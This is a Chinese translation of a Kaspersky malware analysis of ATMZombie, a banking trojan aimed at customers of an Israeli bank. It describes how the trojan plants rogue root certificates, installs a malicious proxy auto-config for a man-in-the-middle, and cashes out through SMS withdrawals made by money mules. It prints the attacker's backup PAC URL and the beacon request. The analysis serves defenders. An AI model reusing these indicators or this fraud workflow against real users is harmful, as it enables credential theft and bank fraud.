> 原文链接: https://www.anquanke.com//post/id/83554 


# ATMZombie: 以色列银行木马


                                阅读量   
                                **71734**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：360安全播报
                                <br>原文地址：[https://securelist.com/blog/research/73866/atmzombie-banking-trojan-in-israeli-waters/     ](https://securelist.com/blog/research/73866/atmzombie-banking-trojan-in-israeli-waters/%20%20%20%20%20)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p1.ssl.qhimg.com/t015c6b0402f78bd0f5.jpg)](https://p1.ssl.qhimg.com/t015c6b0402f78bd0f5.jpg)

        2015年11月，卡巴斯基实验室的研究人员确定银行木马ATMZombie是以色列有史以来第一个银行偷窃恶意软件。它采用复杂注入等阴险的方法。第一种方法，称为“代理更换”（proxy-changer），常用于HTTP数据包检查。它涉及到修改浏览器的代理配置，及作为“中间人”捕捉客户端和服务器之间的流量。

 

        虽然测试有效，窃取银行信息并不容易。银行使用了签署授权证书的加密通道，防止明文式传输的数据流出。但攻击者把自己的证书嵌入了目标电脑常用浏览器的root CA表中。

 

        使用“代理更换”木马窃取银行凭据的方法2005年就有了，被巴西的网络罪犯使用过；然而，直到2012年，卡巴斯基研究人员才给出攻击分析：2009年以来，巴西的银行木马恶意PAC文件很普遍，比如Trojan.Win32.ProxyChanger。

 

[![](https://p3.ssl.qhimg.com/t01936db6e5a1600293.png)](https://p3.ssl.qhimg.com/t01936db6e5a1600293.png)

        这次以色列的银行攻击事件有一个新颖的地方。没有仅仅利用电汇或交易凭证的漏洞，而是利用了银行联机功能的一个漏洞；之后从ATM取钱，协助没有攻击嫌疑的钱骡们；因此该木马被称为 – ATMZombie。

 

        该威胁者似乎广泛活跃于各种银行恶意软件活动，因为他为下列木马注册了域名：Corebot，Pkybot和最近的AndroidLocker。但他没有使用相同的手法。他还运行过恶意在线服务，如恶意软件加密和信用卡转储转让。

 

[![](https://p1.ssl.qhimg.com/t0156475e3f055253c5.png)](https://p1.ssl.qhimg.com/t0156475e3f055253c5.png)



        类似于2012年攻击PSB-retail，Retefe银行木马在去年8月被PaloAlto Networks发现。Retefe像是ATMZombie的前辈，它包含一个ATMZombie没有的Smoke Loader后门。另一个类似的银行木马是由IBM Trusteer确认的Tsukuba。

 

        代理配置文件很容易被找到，因此攻击者成功破坏了数百个受害者机器；但卡巴斯基实验室仅能追踪其中几十个。

 

**概述**

 

        木马植入受害者机器并开始解包，一旦解开，它会存储常见浏览器（Opera，火狐）的证书，并修改它们的配置来实现中间人攻击。然后消除恶意软件之外的其他所有代理，并更改缓存权限为只读。然后，它用Base64编码字符串改变了注册表项，该注册表项包含到自动配置内容（如：使用CAP文件的语法的流量捕获）的路径，并将自己签署证书安装到root文件夹中。之后，它等待受害者登录自己的银行账户，窃取他们的凭据，使用他们的名字登录并利用SMS功能汇款到ATMZombie。

 

[![](https://p2.ssl.qhimg.com/t01c0a4b4f74ff1b3db.png)](https://p2.ssl.qhimg.com/t01c0a4b4f74ff1b3db.png)



**<br>**

**分析**

        调试恶意程序后，我们捕捉到运行时产生的虚拟分配过程。断点分析后发现解压的可执行文件。一旦程序运行完，MZ头会出现在内存中。

 

[![](https://p1.ssl.qhimg.com/t01b99010a56b6c023e.png)](https://p1.ssl.qhimg.com/t01b99010a56b6c023e.png)



        查看恶意软件的汇编代码，我们能够确定一些字符串被嵌入到数据部分。发现的第一个是一大堆对外通迅URL中的Base64字符串，这些是要嵌入到注册表项中的。另外两个Base64串是PAC，嵌在浏览器的网络配置中。

[![](https://p1.ssl.qhimg.com/t015cd39e13fde84cae.png)](https://p1.ssl.qhimg.com/t015cd39e13fde84cae.png)



        第一个字符串解码到：http://retsback.com/config/cfg.pac

        备注：这不是嵌入浏览器网络配置的PAC文件，我们认为这是攻击者的备份，以防原PAC失效。



[![](https://p4.ssl.qhimg.com/t014b8e98ab326e648c.png)](https://p4.ssl.qhimg.com/t014b8e98ab326e648c.png)

[![](https://p3.ssl.qhimg.com/t018cb54607703a1c72.png)](https://p3.ssl.qhimg.com/t018cb54607703a1c72.png)

        Base64字符串中的URL被添加到指纹匹配沙箱的HTTP请求中。Windows ProductID、二进制名称和一个一到五之间的整数传递了空参数。其中整数表示恶意软件被分配到的完整级：从（1）不可信任级到（5）系统级。除了这三个动态值还有一个静态版本值。

 

GET<br>/z/rtback.php?id=[WindowsProductID]&amp;ver=0000002&amp;name=[malware_filename]&amp;ilvl=[integrity_level]HTTP/1.1<br>Host: retsback.com<br>Cache-Control: no-cache

 

        检查二进制文件，我们发现它使用证书通过HTTPS定位数据并成功窃取受害者的凭据。

 

[![](https://p4.ssl.qhimg.com/t01854428aeb181489a.png)](https://p4.ssl.qhimg.com/t01854428aeb181489a.png)



        在受害者的机器上植入证书和代理配置后，受害人登录银行时浏览器通过路由与攻击者的服务器通信。

 

        被诱骗下载恶意软件的不仅是以色列银行的客户，黑客针对了以色列特定的一家银行客户实施攻击。这要求他们有很好的情报搜集技术来获取客户端列表。有了这样的列表，攻击就会变得非常有效率，攻击者就能对针对特定的目标或银行所受到的每封电子邮件或特定链接做手脚。

 

        以下是恶意软件的完整伪代码：

 

[![](https://p5.ssl.qhimg.com/t01e8a9a6667cd8aa17.png)](https://p5.ssl.qhimg.com/t01e8a9a6667cd8aa17.png)



**总结 **

        该恶意软件只是攻击的第一步。第二步包括手动登录目标帐户，并转钱到钱骡的账户。这是很关键的一步，因为实施这一步意味着恶意软件已成功完成了其在攻击中的作用。

 

        手动登录到受害人的银行账号这一步也不能掉以轻心。世界各地的许多银行都在使用指纹设备，以确保用户使用值得信赖的终端操作。对于不受信任的机器，银行会实施扩展保护机制，防止在这篇文章中详细描述的攻击。此外，银行会跟踪异常，并向其信息安全人员发送警报。

 

[![](https://p0.ssl.qhimg.com/t01741323e3728b0091.png)](https://p0.ssl.qhimg.com/t01741323e3728b0091.png)



        在受害者发现并联系银行支持团队报告账户被盗之前，攻击者将偷到的钱通过钱骡的手机号码和以色列个人身份信息（PII）转移。我们戏称为钱骡为“僵尸”，调查中，研究人员发现青少年会被诱骗从ATM中提取现金，以赚取其中很少的一部分。后来，他们通过不同的媒介，比如邮局，发送的剩下的钱。

 

        该技术能让攻击者保持匿名，并远程监控整个活动。通过银行的指导文件，非注册用户可以研究其功能并分析对其攻击并偷窃钱财的可能性。此功能称为“SMS交易”；它在过去的几年中被广泛使用，可以让家长给正在服兵役或在学校学习的孩子寄钱。

 

        只要拥有几个特定的信息，比如日期，以色列ID，姓名和手机的拥有者数量，我们就能收到授权取现的短信。

 

        卡巴斯基实验室开发了保护不受proxy-changer攻击的新型方法。可以在[这里](https://securelist.com/analysis/publications/57891/pac-the-problem-auto-config/#attachment_63112)获取。
